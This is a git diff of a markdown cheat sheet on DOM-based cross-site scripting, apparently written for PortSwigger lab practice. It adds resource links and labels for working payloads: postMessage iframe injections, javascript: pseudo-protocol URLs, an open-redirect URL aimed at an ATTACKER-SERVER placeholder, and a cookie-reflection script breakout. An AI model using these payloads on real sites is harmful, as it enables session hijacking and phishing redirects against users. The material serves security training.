@@ -6,6 +6,17 @@
 
 * [Portswigger Labs Cheat Sheet / Payloads](#cheat-sheet)
 
+
+## Resources
+
+* https://portswigger.net/web-security/dom-based
+
+* https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/11-Client-side_Testing/01-Testing_for_DOM-based_Cross_Site_Scripting
+
+* https://owasp.org/www-community/attacks/DOM_Based_XSS
+
+
+
 ## Recon
 
 ### Identify DOM-based Vulnerabilities
@@ -42,11 +53,14 @@
 * Use web messages as a source to send malicious data to a target window that will take in that data and include it in a dangerous sink.  
 
     * Example:  window.postMessage(“\<img src=x onerror=alert(1)\>”)
+    
+    * Payload: 
 
 ```html
 <iframe src="https://VULNERABLE-APPLICATION.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
 ```
-<br></br>
+<br>
+
 * **Vulnerable Code:**
 
 ```javascript
@@ -63,11 +77,13 @@ window.addEventListener('message', function(e) {
 * Use web messages as a source to send malicious data to a target window that will take in that data and include it in a dangerous sink.  Example, the code will place the user-controllable input into the location.href sink, if the message contains the String “http:”. 
 
     * Example:  window.postMessage(“javascript:alert(1)//http:”)
+    
+    * Payload: 
 
 ```html
 <iframe src="https://VULNERABLE-APPLICATION.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
 ```
-<br></br>
+<br>
 
 * **Vulnerable Code:**
 
@@ -88,11 +104,13 @@ window.addEventListener('message', function(e) {
 
 * There is a client-side script on the application that has an event listener that is listening for a web message.  It is possible to submit crafted input which will be included in the “src” attribute of an \<iframe\>.  This is essentially the “location.href” sink.  We can use a JavaScript pseudo-protocol payload here – javascript:print()
 
+   * Payload: 
+
 ```html
 <iframe src=https://VULNERABLE-APPLICATION.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
 ```
 
-<br></br>
+<br>
 
 * **Vulnerable Code:**
 
@@ -126,12 +144,19 @@ window.addEventListener('message', function(e) {
 
 ### DOM XSS - Open Redirection
 
-* There was a client-side script on the application that is taking in a query parameter called “url” and using the value in a location.href sink.  The URL needs to begin with “https://”.  The JavaScript Pseudo-protocol will not work here in this case.  This will simply redirect a user to a different website, can be used for phishing.
+* There was a client-side script on the application that is taking in a query parameter called “url” and using the value in a location.href sink.  The URL needs to begin with “https://”.  
 
+* The JavaScript Pseudo-protocol will not work here in this case, because we don't control the beginning of the href value.  This will simply redirect a user to a different website, can be used for phishing.
+
+   * Example:  httpss://VULNERABLE-APPLICATION.net/post?postId=4&url=httpss://*user-input*
+
+   * Payload:
+   
 ```
-https://VULNERABLE-APPLICATION.net/post?postId=4&url=https://ATTACKER-SERVER.web-security-academy.net/
+https://VULNERABLE-APPLICATION.net/post?postId=4&url=https://ATTACKER-SERVER
 ```
 
+<br>
 
 * **Vulnerable Code:**
 
@@ -145,7 +170,7 @@ https://VULNERABLE-APPLICATION.net/post?postId=4&url=https://ATTACKER-SERVER.web
 
 * The “window.location” source is being appended to a Cookie using the “document.cookie”.  This Cookie value is reflected back in the application's response within an HTML attribute.  Submit a crafted URL that will break out of the HTML context and execute JavaScript code.
 
-    * Example:  \<a href='https://VULNERABLE-APP.net/product?productId=*user-input*'\>
+    * Example:  \<a href='httpss://VULNERABLE-APP.net/product?productId=*user-input*'\>
 
     * Payload:  '\>\<script\>print()\</script\>
 
@@ -154,6 +179,8 @@ https://VULNERABLE-APPLICATION.net/post?postId=4&url=https://ATTACKER-SERVER.web
 ```html
 <iframe src="https://VULNERABLE-APP.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://VULNERABLE-APP.net';window.x=1;">
 ```
+
+<br>
 
 * **Vulnerable Code:**
 
